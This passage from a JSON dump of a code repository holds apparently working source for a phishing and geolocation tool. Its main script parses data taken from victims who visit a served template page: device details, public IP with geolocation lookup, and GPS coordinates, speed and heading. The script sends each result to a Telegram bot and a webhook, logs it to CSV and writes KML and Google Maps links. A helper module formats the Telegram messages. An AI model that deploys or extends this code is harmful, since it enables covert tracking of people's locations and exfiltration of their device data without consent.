{C}Resolution : {W}{var_res}\n{G}[+] {C}Browser    : {W}{var_browser}\n{G}[+] {C}Public IP  : {W}{var_ip}\n'''\n\t\tutils.print(device_info)\n\t\tsend_telegram(info_json, 'device_info')\n\t\tsend_webhook(info_json, 'device_info')\n\n\t\tif ip_address(var_ip).is_private:\n\t\t\tutils.print(f'{Y}[!] Skipping IP recon because IP address is private{W}')\n\t\telse:\n\t\t\trqst = requests.get(f'https://ipwhois.app/json/{var_ip}')\n\t\t\ts_code = rqst.status_code\n\n\t\t\tif s_code == 200:\n\t\t\t\tdata = rqst.text\n\t\t\t\tdata = loads(data)\n\t\t\t\tvar_continent = str(data['continent'])\n\t\t\t\tvar_country = str(data['country'])\n\t\t\t\tvar_region = str(data['region'])\n\t\t\t\tvar_city = str(data['city'])\n\t\t\t\tvar_org = str(data['org'])\n\t\t\t\tvar_isp = str(data['isp'])\n\n\t\t\t\tdata_row.extend([var_continent, var_country, var_region, var_city, var_org, var_isp])\n\t\t\t\tip_info = f'''{Y}[!] IP Information :{W}\n\n{G}[+] {C}Continent : {W}{var_continent}\n{G}[+] {C}Country   : {W}{var_country}\n{G}[+] {C}Region    : {W}{var_region}\n{G}[+] {C}City      : {W}{var_city}\n{G}[+] {C}Org       : {W}{var_org}\n{G}[+] {C}ISP       : {W}{var_isp}\n'''\n\t\t\t\tutils.print(ip_info)\n\t\t\t\tsend_telegram(data, 'ip_info')\n\t\t\t\tsend_webhook(data, 'ip_info')\n\n\twith open(RESULT, 'r') as result_file:\n\t\tresults = result_file.read()\n\t\ttry:\n\t\t\tresult_json = loads(results)\n\t\texcept decoder.JSONDecodeError:\n\t\t\tutils.print(f'{R}[-] {C}Exception : {R}{traceback.format_exc()}{W}')\n\t\telse:\n\t\t\tstatus = result_json['status']\n\t\t\tif status == 'success':\n\t\t\t\tvar_lat = result_json['lat']\n\t\t\t\tvar_lon = result_json['lon']\n\t\t\t\tvar_acc = result_json['acc']\n\t\t\t\tvar_alt = result_json['alt']\n\t\t\t\tvar_dir = result_json['dir']\n\t\t\t\tvar_spd = result_json['spd']\n\n\t\t\t\tdata_row.extend([var_lat, var_lon, var_acc, var_alt, var_dir, var_spd])\n\t\t\t\tloc_info = f'''{Y}[!] Location Information :{W}\n\n{G}[+] {C}Latitude  : {W}{var_lat}\n{G}[+] {C}Longitude : {W}{var_lon}\n{G}[+] {C}Accuracy  : {W}{var_acc}\n{G}[+] {C}Altitude  : {W}{var_alt}\n{G}[+] {C}Direction : {W}{var_dir}\n{G}[+] {C}Speed     : {W}{var_spd}\n'''\n\t\t\t\tutils.print(loc_info)\n\t\t\t\tsend_telegram(result_json, 'location')\n\t\t\t\tsend_webhook(result_json, 'location')\n\t\t\t\tgmaps_url = f'{G}[+] {C}Google Maps : {W}https://www.google.com/maps/place/{var_lat.strip(\" deg\")}+{var_lon.strip(\" deg\")}'\n\t\t\t\tgmaps_json = {'url': f'https://www.google.com/maps/place/{var_lat.strip(\" deg\")}+{var_lon.strip(\" deg\")}'}\n\t\t\t\tutils.print(gmaps_url)\n\t\t\t\tsend_telegram(gmaps_json, 'url')\n\t\t\t\tsend_webhook(gmaps_json, 'url')\n\n\t\t\t\tif kml_fname is not None:\n\t\t\t\t\tkmlout(var_lat, var_lon)\n\t\t\telse:\n\t\t\t\tvar_err = result_json['error']\n\t\t\t\tutils.print(f'{R}[-] {C}{var_err}\\n')\n\t\t\t\tsend_telegram(result_json, 'error')\n\t\t\t\tsend_webhook(result_json, 'error')\n\n\tcsvout(data_row)\n\tclear()\n\treturn\n\n\ndef kmlout(var_lat, var_lon):\n\twith open(TEMP_KML, 'r') as kml_sample:\n\t\tkml_sample_data = kml_sample.read()\n\n\tkml_sample_data = kml_sample_data.replace('LONGITUDE', var_lon.strip(' deg'))\n\tkml_sample_data = kml_sample_data.replace('LATITUDE', var_lat.strip(' deg'))\n\n\twith open(f'{path_to_script}/{kml_fname}.kml', 'w') as kml_gen:\n\t\tkml_gen.write(kml_sample_data)\n\n\tutils.print(f'{Y}[!] KML File Generated!{W}')\n\tutils.print(f'{G}[+] {C}Path : {W}{path_to_script}/{kml_fname}.kml')\n\n\ndef csvout(row):\n\twith open(DATA_FILE, 'a') as csvfile:\n\t\tcsvwriter = writer(csvfile)\n\t\tcsvwriter.writerow(row)\n\tutils.print(f'{G}[+] {C}Data Saved : {W}{path_to_script}/db/results.csv\\n')\n\n\ndef clear():\n\twith open(RESULT, 'w+'):\n\t\tpass\n\twith open(INFO, 'w+'):\n\t\tpass\n\n\ndef repeat():\n\tclear()\n\twait()\n\n\ndef cl_quit():\n\twith open(PID_FILE, 'r') as pid_info:\n\t\tpid = int(pid_info.read().strip())\n\t\tkill(pid, SIGTERM)\n\tremove(PID_FILE)\n\tsys.exit()\n\n\ntry:\n\tbanner()\n\tclear()\n\tSITE = template_select(SITE)\n\tserver()\n\twait()\n\tdata_parser()\nexcept KeyboardInterrupt:\n\tutils.print(f'{R}[-] {C}Keyboard Interrupt.{W}')\n\tcl_quit()\nelse:\n\trepeat()\n"
        },
        {
          "name": "telegram_api.py",
          "type": "blob",
          "size": 2.0458984375,
          "content": "import utils\nimport requests\nfrom json import dumps, loads\n\nR = '\\033[31m'  # red\nG = '\\033[32m'  # green\nC = '\\033[36m'  # cyan\nW = '\\033[0m'   # white\nY = '\\033[33m'  # yellow\n\n\ndef send_request(token, msg):\n    api_url = f'https://api.telegram.org/bot{token[0]}:{token[1]}/sendMessage'\n    api_params = {\n        'chat_id': token[2],\n        'text': msg,\n        'parse_mode': 'MarkdownV2'\n    }\n    rqst = requests.get(api_url, params=api_params, timeout=10)\n    if rqst.status_code != 200:\n        utils.print(f'{R}[-] {C}Telegram :{W} [{rqst.status_code}] {loads(rqst.text)[\"description\"]}\\n')\n\n\ndef tgram_sender(msg_type, content, token):\n    json_str = dumps(content)\n    json_content = loads(json_str)\n    if msg_type == 'device_info':\n        info_message = f\"\"\"\n*Device Information*\n\n```\nOS         : {json_content['os']}\nPlatform   : {json_content['platform']}\nBrowser    : {json_content['browser']}\nGPU Vendor : {json_content['vendor']}\nGPU        : {json_content['render']}\nCPU Cores  : {json_content['cores']}\nRAM        : {json_content['ram']}\nPublic IP  : {json_content['ip']}\nResolution : {json_content['ht']}x{json_content['wd']}\n```\"\"\"\n        send_request(token, info_message)\n\n    if msg_type == 'ip_info':\n        ip_message = f\"\"\"\n*IP Information*\n\n```\nContinent : {json_content['continent']}\nCountry   : {json_content['country']}\nRegion    : {json_content['region']}\nCity      : {json_content['city']}\nOrg       : {json_content['org']}\nISP       : {json_content['isp']}\n```\n\"\"\"\n        send_request(token, ip_message)\n\n    if msg_type == 'location':\n        loc_message = f\"\"\"\n*Location Information*\n\n```\nLatitude  : {json_content['lat']}\nLongitude : {json_content['lon']}\nAccuracy  : {json_content['acc']}\nAltitude  : {json_content['alt']}\nDirection : {json_content['dir']}\nSpeed     : {json_content['spd']}\n```\n\"\"\"\n        send_request(token, loc_message)\n\n    if msg_type == 'url':\n        url_msg = json_content['url']\n        send_request(token, url_msg)\n\n    if msg_type == 'error':\n        error_msg = json_content['error']\n        send_request(token, error_msg)\n"
        },
        {
          "name": "template",
          "type": "tree",
          "content": null
        },
        {
          "name": "utils.py",
          "type": "blob",
          "size": 0.533203125,
          "content": "#!/usr/bin/env python3\nimport requests\nimport uuid\nimport sys\nimport re\nimport builtins\n\ndef downloadImageFromUrl(url, path):\n    if not url.startswith('http'):\n        return None\n    img_data = requests.get(url).content\n    fPath = path+'/'+str(uuid.uuid1())+'.jpg'\n    with open(fPath, 'wb') as handler:\n        handler.write(img_data)\n    return fPath\n\ndef print(ftext, **args):\n    if sys.stdout.isatty():\n        builtins.print (ftext, flush=True, **args)\n    else:\n        builtins.print(re.sub('\\33\\[\\d+m',' ',ftext), flush=True, **args)\n"
        }
      ]
    }
  ]
}